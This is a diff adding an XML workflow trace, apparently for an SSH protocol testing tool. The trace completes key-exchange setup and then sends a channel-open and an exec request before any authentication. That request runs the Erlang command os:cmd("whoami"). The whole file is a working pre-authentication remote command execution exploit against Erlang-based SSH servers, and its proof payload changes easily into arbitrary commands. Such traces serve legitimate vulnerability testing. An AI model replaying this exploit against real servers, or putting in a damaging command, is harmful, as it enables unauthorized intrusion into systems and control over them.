@@ -1,0 +1,62 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<workflowTrace>
+    <Send>
+        <messages>
+            <VersionExchange />
+        </messages>
+    </Send>
+    <Receive>
+        <expectedMessages>
+            <VersionExchange />
+        </expectedMessages>
+    </Receive>
+    <ChangePacketLayer to="BINARY_PACKET" />
+    <Send>
+        <messages>
+            <KeyExchangeInit />
+        </messages>
+    </Send>
+    <Receive>
+        <expectedMessages>
+            <KeyExchangeInit />
+        </expectedMessages>
+    </Receive>
+    <Send>
+        <messages>
+            <ChannelOpenSession />
+            <ChannelRequestExec>
+                <commandLength>
+                    <IntegerExplicitValueModification>
+                        <explicitValue>17</explicitValue>
+                    </IntegerExplicitValueModification>
+                </commandLength>
+                <command>
+                    <StringExplicitValueModification>
+                        <explicitValue>os:cmd("whoami").</explicitValue>
+                    </StringExplicitValueModification>
+                </command>
+            </ChannelRequestExec>
+        </messages>
+    </Send>
+    <DynamicKeyExchange />
+    <Receive>
+        <expectedMessages>
+            <ExtensionInfo />
+            <ChannelSuccess />
+            <ChannelData />
+            <ChannelEof />
+            <ChannelRequestExitStatus />
+            <ChannelClose />
+        </expectedMessages>
+    </Receive>
+    <Send>
+        <messages>
+            <ServiceRequest />
+        </messages>
+    </Send>
+    <Receive>
+        <expectedMessages>
+            <ServiceAccept />
+        </expectedMessages>
+    </Receive>
+</workflowTrace>
